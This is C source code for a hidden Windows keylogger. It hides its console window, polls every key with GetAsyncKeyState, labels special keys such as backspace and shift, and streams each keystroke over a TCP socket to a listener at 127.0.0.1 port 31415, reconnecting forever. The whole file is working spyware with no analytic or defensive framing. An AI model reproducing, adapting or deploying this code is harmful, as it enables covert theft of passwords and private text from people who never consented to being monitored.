#include <winsock2.h>
#include <windows.h>
#include <winuser.h>

#pragma comment(lib, "ws2_32.lib") //Winsock Library
#pragma comment(lib, "user32.lib") 
SOCKET s;

int initConnection() {
	WSADATA wsa;
	struct sockaddr_in server;

	if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
		return 1;

	if((s = socket(AF_INET, SOCK_STREAM, 0) ) == INVALID_SOCKET)
		return 1;

	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(31415);

	if(connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
		return 1;

	return 0;
}

void verifyKey(int key_stroke, char* c) {
	memset(&c[0], 0, sizeof(c));

    if (key_stroke == 8)
    	strncpy(c, "[BKSPACE]", 10);
    else if (key_stroke == 13)
        strncpy(c, "[NEWLINE]", 10);
    else if (key_stroke == 32)
        strncpy(c, "[SPACE]", 10);
    else if (key_stroke == VK_CAPITAL)
        strncpy(c, "[CAPS]", 10);
    else if (key_stroke == VK_TAB)
        strncpy(c, "[TAB]", 10);
    else if (key_stroke == VK_SHIFT)
        strncpy(c, "[SHIFT]", 10);
    else if (key_stroke == VK_CONTROL)
        strncpy(c, "[CONTROL]", 10);
    else if (key_stroke == VK_ESCAPE)
        strncpy(c, "[ESCAPE]", 10);
    else if (key_stroke == VK_LEFT)
        strncpy(c, "[LEFT]", 10);
    else if (key_stroke == VK_UP)
        strncpy(c, "[UP]", 10);
    else if (key_stroke == VK_RIGHT)
        strncpy(c, "[RIGHT]", 10);
    else if (key_stroke == VK_DOWN)
        strncpy(c, "[DOWN]", 10);
    else if (key_stroke == 190 || key_stroke == 110)
        strncpy(c, ".", 10);
    else {
        char tmp = (char)key_stroke;
		strncat(c, &tmp, 1);
	}
}

int main() {
	char c[10];
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	connect:
		while(initConnection()) {}	//Keep retrying till we establish a connection
	do {
        for(int i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                verifyKey(i, c);
            	if(send(s, c, sizeof(c) , 0) < 0)
				goto connect;
			}
        }
	} while(1);
    return 0;
}
